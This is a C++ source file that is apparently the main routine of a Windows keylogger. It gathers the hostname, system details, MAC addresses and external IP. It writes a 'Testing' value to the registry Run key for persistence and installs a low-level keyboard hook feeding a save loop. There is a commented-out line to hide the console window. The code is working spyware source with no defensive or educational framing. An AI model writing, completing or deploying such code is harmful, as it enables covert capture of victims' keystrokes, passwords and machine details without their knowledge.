#include "GetSYSinfo.h"
#include "systeminfo.h"
#include "Keylogger.h"
#include "save.h"
#include "AddPersistance.h"
#include <thread>
#include <atomic>
#include <rpc.h>
#include <assert.h>
#include <stdio.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")

using namespace std;

int main(int argc, char* argv[]) {
	GetSYSinfo::GetHostname();

	int computerInfoResult = GetSYSinfo::GetComputerInfo(argc, argv);
	if (computerInfoResult != 0) {
		return computerInfoResult;
	}

	char* macResultEthernet = GetSYSinfo::GetMAC(MIB_IF_TYPE_ETHERNET);
	if (macResultEthernet != NULL) {
		free(macResultEthernet);
	}

	char* macResultWifi = GetSYSinfo::getMAC(IF_TYPE_IEEE80211);
	if (macResultWifi != NULL) {
		free(macResultWifi);
	}

    GetSYSinfo::GetExternalIPAddress();

    // Add Persistence to SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    wstring FP;
    FP.resize(MAX_PATH);
    GetModuleFileNameW(NULL, &FP[0], MAX_PATH);

    LONG ln = RegGetValueW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", L"Testing", RRF_RT_REG_SZ, 0, 0, 0);
    int tog = 0;
    if (ERROR_SUCCESS == ln) {
        tog = 1;
    }

    // Call AddPersistence to add persistence
    if (tog == 0) {
        bool added = AddPersistence(FP);
        if (added) {
            wcout << L"Persistence added." << endl;
        }
        else {
            wcout << L"Failed to add persistence." << endl;
        }
    }

    // Initialize the keylogger
    thread t[1];
	t[0] = thread(saveLoop);
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	HHOOK KeyboardHook;
	KeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger::KeyboardProc, NULL, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(KeyboardHook);

    return 0;
}

//#define CURL_STATICLIB This was the fix which helped make it a stUatic linkage to CURL >> C/C++ - Preprocessor - Preprocessor Definitions - "Add CURL_STATICLIB"
